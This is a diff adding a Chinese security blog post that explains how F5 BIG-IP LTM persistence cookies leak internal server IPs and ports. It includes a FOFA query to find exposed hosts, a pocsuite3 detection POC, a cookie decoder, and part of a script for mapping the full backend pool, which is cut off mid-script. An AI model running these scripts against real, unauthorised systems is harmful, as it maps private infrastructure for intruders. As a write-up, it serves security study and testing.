@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言挺久没更新文章了，一方面是比赛原因，前几天才结束；另一方面也感觉到自己懒惰了下来，希望接下来能恢复一下状态。工作、挖洞、记录和分享… 在和项目组的C1sr师傅讨论一个漏洞，挺好玩的，第一次遇到，记录一下。  介绍 F5 BIG-IP LTM又叫本地流量管理器、 网络负载均衡器、 服务器负载均衡  。 当然与之现对应的是F5 BIG-IP  GTM， 广域网流量管理 、 全局负载均衡 。 两者的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="F5-LTM-leak-intranet-ip">
+<meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;">
+<meta property="og:site_name" content="Rj45&#39;s blog">
+<meta property="og:description" content="前言挺久没更新文章了，一方面是比赛原因，前几天才结束；另一方面也感觉到自己懒惰了下来，希望接下来能恢复一下状态。工作、挖洞、记录和分享… 在和项目组的C1sr师傅讨论一个漏洞，挺好玩的，第一次遇到，记录一下。  介绍 F5 BIG-IP LTM又叫本地流量管理器、 网络负载均衡器、 服务器负载均衡  。 当然与之现对应的是F5 BIG-IP  GTM， 广域网流量管理 、 全局负载均衡 。 两者的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200724221608608.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200724224234395.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200724224526154.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200724231814461.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200725001907479.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200725002101319.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200725003355310.png">
+<meta property="og:updated_time" content="2020-07-24T16:36:39.323Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;F5-LTM-leak-intranet-ip&#x2F;image-20200724221608608.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/my.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/my.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/my.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>F5-LTM-leak-intranet-ip</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+<link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/xray-crawlergo-xray-server/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&text=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&is_video=false&description=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=F5-LTM-leak-intranet-ip&body=Check out this article: https://rj45mp.github.io/F5-LTM-leak-intranet-ip/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&name=F5-LTM-leak-intranet-ip&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞"><span class="toc-number">3.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FOFA"><span class="toc-number">4.</span> <span class="toc-text">FOFA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">6.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、泄露信息"><span class="toc-number">6.1.</span> <span class="toc-text">1、泄露信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、穷举架构"><span class="toc-number">6.2.</span> <span class="toc-text">2、穷举架构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        F5-LTM-leak-intranet-ip
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-24T14:08:11.000Z" itemprop="datePublished">2020-07-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>挺久没更新文章了，一方面是比赛原因，前几天才结束；另一方面也感觉到自己懒惰了下来，希望接下来能恢复一下状态。工作、挖洞、记录和分享…</p>
+<p>在和项目组的C1sr师傅讨论一个漏洞，挺好玩的，第一次遇到，记录一下。</p>
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200724221608608.png" alt="image-20200724221608608"></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> F5 BIG-IP LTM又叫本地流量管理器、 网络负载均衡器、 服务器负载均衡  。</p>
+<p>当然与之现对应的是F5 BIG-IP  GTM， 广域网流量管理 、 全局负载均衡 。</p>
+<p>两者的区别在于LTM负责内网的负载均衡， GTM负责外网的负载均衡。</p>
+<p>如负载均衡， LTM的作用是针对单台服务器的性能瓶颈，通过将请求分配到多个节点服务器上来提高业务的处理能力。</p>
+<p>F5 BIG-IP LTM有两种部署模式，分别是串行和并行部署：</p>
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200724224234395.png" alt="image-20200724224234395"></p>
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200724224526154.png" alt="image-20200724224526154"></p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>在F5 BIG-IP LTM负载均衡中，为实现请求和应答间的会话保持，F5实现了多种保持机制，其中一种就是通过修改cookie来实现的。</p>
+<p>F5 BIG-IP LTM Cookie保持机制：</p>
+<p>在客户端向F5服务端发起请求时，服务端使用sek-cookie给客户端设置一个cookie，</p>
+<p>这个cookie为 BIGipServer<pool_name>样式，其内包含了客户端的请求、经过编码的目标服务器ip和port。</pool_name></p>
+<p>后续第二次收到客户端的请求时，F5服务端会查看该cookie，然后判断应该将该请求发送给哪个下行的服务器，</p>
+<p>从而实现会话的保持。</p>
+<p>通过对cookie的解码，即可泄露出下行服务器的ip和port,甚至获取到整个负载均衡架构的server的ip和port。</p>
+<p>接下来，演示该漏洞的检测和利用过程。</p>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><p><img src="/F5-LTM-leak-intranet-ip/image-20200724231814461.png" alt="image-20200724231814461"></p>
+<p>语法：header=”BIGipServerpool” &amp;&amp; country=”CN”</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output,POCBase,register_poc,requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BooleanBindPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID=<span class="string">'1'</span>;version=<span class="string">''</span>;author=<span class="string">'Rj45mp'</span>;vulDate=<span class="string">''</span>;createDate=<span class="string">''</span>;updateDate=<span class="string">''</span>;references=[<span class="string">''</span>];name=<span class="string">'F5-LTM-leak-intranet-ip'</span></span><br><span class="line">    appPowerLink=<span class="string">''</span>;appName=<span class="string">''</span>;appVersion=<span class="string">''</span>;vulType=<span class="string">''</span>;desc=<span class="string">''</span>;samples=[<span class="string">''</span>];install_requires=[];pocDesc=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result=&#123;&#125;</span><br><span class="line">        payload = <span class="string">"BIGipServerpool"</span></span><br><span class="line">        target=self.url</span><br><span class="line">        req=requests.get(target)</span><br><span class="line">        res=req.cookies</span><br><span class="line">        <span class="keyword">if</span>( payload <span class="keyword">in</span> res) <span class="keyword">and</span> <span class="string">'.0000'</span> <span class="keyword">in</span> res:</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>]=&#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>]=target</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>]=payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_output</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_output</span><span class="params">(self,result)</span>:</span></span><br><span class="line">        output=Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'target is not vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">register_poc(BooleanBindPOC)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200725001907479.png" alt="image-20200725001907479"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="1、泄露信息"><a href="#1、泄露信息" class="headerlink" title="1、泄露信息"></a>1、泄露信息</h3><p>泄露内网的ip和port，取cookie中的数据<code>1828917420.25627.0000</code>，进行解码，得：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example string: 110536896.20480.0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s encoded_string"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">encoded_string = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[*] String to decode: %s\n"</span> % encoded_string</span><br><span class="line"></span><br><span class="line">(host, port, end) = encoded_string.split(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line">(a, b, c, d) = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> struct.pack(<span class="string">"&lt;I"</span>, int(host))]</span><br><span class="line"></span><br><span class="line">(e) = [ord(e) <span class="keyword">for</span> e <span class="keyword">in</span> struct.pack(<span class="string">"&lt;H"</span>, int(port))]</span><br><span class="line">port = <span class="string">"0x%02X%02X"</span> % (e[<span class="number">0</span>],e[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Decoded Host and Port: %s.%s.%s.%s:%s\n"</span> % (a,b,c,d, int(port,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200725002101319.png" alt="image-20200725002101319"></p>
+<h3 id="2、穷举架构"><a href="#2、穷举架构" class="headerlink" title="2、穷举架构"></a>2、穷举架构</h3><p>在负载均衡中，当大量请求发起并且超过特定的阈值的时，就会把请求下发到其他的server，这时候结合F5 BIG-IP LTM的Cookie保持机制的可拆解性，就有可能获取到整个负载均衡架构的server的ip和port。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment">#import sys</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> netaddr</span><br><span class="line"><span class="keyword">from</span> progress.bar <span class="keyword">import</span> Bar<span class="comment"># as Bar</span></span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Colors</span>:</span></span><br><span class="line">    BLUE 		= <span class="string">'\033[94m'</span></span><br><span class="line">    GREEN 		= <span class="string">'\033[32m'</span></span><br><span class="line">    RED 		= <span class="string">'\033[0;31m'</span></span><br><span class="line">    DEFAULT		= <span class="string">'\033[0m'</span></span><br><span class="line">    ORANGE 		= <span class="string">'\033[33m'</span></span><br><span class="line">    WHITE 		= <span class="string">'\033[97m'</span></span><br><span class="line">    BOLD 		= <span class="string">'\033[1m'</span></span><br><span class="line">    BR_COLOUR 	= <span class="string">'\033[1;37;40m'</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(</span><br><span class="line">					prog=<span class="string">'quickCook.py'</span>,</span><br><span class="line">					description=<span class="string">' [ F5 BIG-IP ] COOKIE INFORMATION DISCLOSURE '</span>, </span><br><span class="line">					epilog=<span class="string">'[+] Demo: quickCook.py --host 192.168.1.1 --cookie-name "BIGipServerPool_X" --req 50'</span>,</span><br><span class="line">					version=<span class="string">"0.2"</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, 		 dest=<span class="string">"HOST"</span>,  	help=<span class="string">'Host'</span>,			required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--ssl'</span>, 		 dest=<span class="string">"SSL"</span>,  	help=<span class="string">'use ssl'</span>,  		action=<span class="string">"store_true"</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'--cookie-name'</span>, dest=<span class="string">"COOK"</span>,  	help=<span class="string">'Cookie Name'</span>,  	required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, 		 dest=<span class="string">"PORT"</span>,  	help=<span class="string">'Port'</span>,			default=<span class="number">80</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--req'</span>, 		 dest=<span class="string">"REQ"</span>,  	help=<span class="string">'Total Request'</span>,	default=<span class="number">1</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--uri'</span>, 		 dest=<span class="string">"URI"</span>,  	help=<span class="string">'URI path'</span>,	   	default=<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie name</span></span><br><span class="line">args	= 	parser.parse_args()</span><br><span class="line"></span><br><span class="line">HST   	= 	args.HOST</span><br><span class="line">xSSL 	=   args.SSL</span><br><span class="line">port 	= 	args.PORT</span><br><span class="line">cookie 	= 	args.COOK <span class="comment">#  cookie name </span></span><br><span class="line">uPath 	= 	args.URI  <span class="comment"># "index.html"</span></span><br><span class="line">loop 	= 	int(args.REQ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> xSSL:</span><br><span class="line">	port = <span class="number">443</span></span><br><span class="line">	fullHost 		= 	<span class="string">"https://"</span>+HST+<span class="string">":"</span>+str(port)+<span class="string">"/"</span>+uPath</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	fullHost 		= 	<span class="string">"http://"</span>+HST+<span class="string">":"</span>+str(port)+<span class="string">"/"</span>+uPath</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeReqHeaders</span><span class="params">(host)</span>:</span></span><br><span class="line">	headers = &#123;&#125;</span><br><span class="line">	</span><br><span class="line">	headers[<span class="string">"Host"</span>] 			=  host</span><br><span class="line">	headers[<span class="string">"User-Agent"</span>]		= <span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:52.1) Gecko/20100101 Firefox/52.0"</span></span><br><span class="line">	headers[<span class="string">"Accept"</span>] 			= <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span> </span><br><span class="line">	headers[<span class="string">"Accept-Languag"</span>] 	= <span class="string">"es-AR,en-US;q=0.7,en;q=0.3"</span></span><br><span class="line">	headers[<span class="string">"Content-Type"</span>] 	= <span class="string">"text/html"</span>	</span><br><span class="line">	headers[<span class="string">"Connection"</span>] 		= <span class="string">"close"</span></span><br><span class="line">	<span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCookie</span><span class="params">(srchCookName)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> xSSL:</span><br><span class="line">		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST),allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span> )</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST),allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">	headerSrv 	=   r1.headers[<span class="string">"Set-Cookie"</span>].split()</span><br><span class="line">	<span class="keyword">for</span> xCooks <span class="keyword">in</span> range(<span class="number">0</span>,len(headerSrv)):</span><br><span class="line"></span><br><span class="line">		srvCook = headerSrv[xCooks].split(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#print " cookies "+str(srvCook[1])</span></span><br><span class="line">		<span class="keyword">if</span> srchCookName == srvCook[<span class="number">0</span>]:</span><br><span class="line">			decIp = srvCook[<span class="number">1</span>][:<span class="number">-1</span>]</span><br><span class="line">			getIP = decIp[:<span class="number">-11</span>]</span><br><span class="line">			ipLeaked = str((netaddr.IPAddress(getIP)))</span><br><span class="line">			fuck = ipLeaked.split(<span class="string">"."</span>)</span><br><span class="line">			fuck.reverse()</span><br><span class="line">			ip_final = <span class="string">''</span></span><br><span class="line">			count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> item <span class="keyword">in</span> fuck:</span><br><span class="line">				ip_final += item</span><br><span class="line">				<span class="keyword">if</span> count &lt; <span class="number">3</span>:</span><br><span class="line">					ip_final += <span class="string">'.'</span></span><br><span class="line">					count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">			rawPort   	= str(srvCook[<span class="number">1</span>].split(<span class="string">"."</span>)[<span class="number">1</span>]) <span class="comment">#str(srvCook).split(".")[0]</span></span><br><span class="line">			cookieHex 	= hex(int(rawPort))[<span class="number">2</span>:]</span><br><span class="line">			portHex 	= (cookieHex[<span class="number">2</span>:] + cookieHex[:<span class="number">2</span>])</span><br><span class="line">			portDec  	= int(portHex,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">			portX = portDec</span><br><span class="line"></span><br><span class="line">			leaked = Colors.WHITE+<span class="string">" | "</span>+Colors.GREEN + decIp +Colors.WHITE+ <span class="string">" \t | "</span>+Colors.ORANGE+ ip_final +Colors.GREEN+ <span class="string">" : "</span>+Colors.BLUE+str(portX)+Colors.DEFAULT </span><br><span class="line">			</span><br><span class="line">			<span class="keyword">return</span> leaked</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">	                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        hCode = r1.status_code</span><br><span class="line">	<span class="comment">#return " | ----------------------------- | -------------------------"</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">" | ---------- [ "</span>+str(hCode)+<span class="string">" ] ---------- | -------------------------"</span></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] host/ip: \t\t"</span>+HST</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Port: \t\t"</span>+str(port)</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Cookie name: \t"</span>+cookie</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Total Request: \t"</span>+str(loop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tblHead = <span class="string">'''</span></span><br><span class="line"><span class="string"> +-------------------------------+---------------------------------------+</span></span><br><span class="line"><span class="string"> | Cookie value \t\t |  &lt; '''</span>+Colors.ORANGE+<span class="string">'Host'</span>+Colors.DEFAULT+<span class="string">''' &gt; : &lt; '''</span>+Colors.BLUE+<span class="string">'Port'</span>+Colors.DEFAULT+<span class="string">''' &gt; \t\t | </span></span><br><span class="line"><span class="string"> 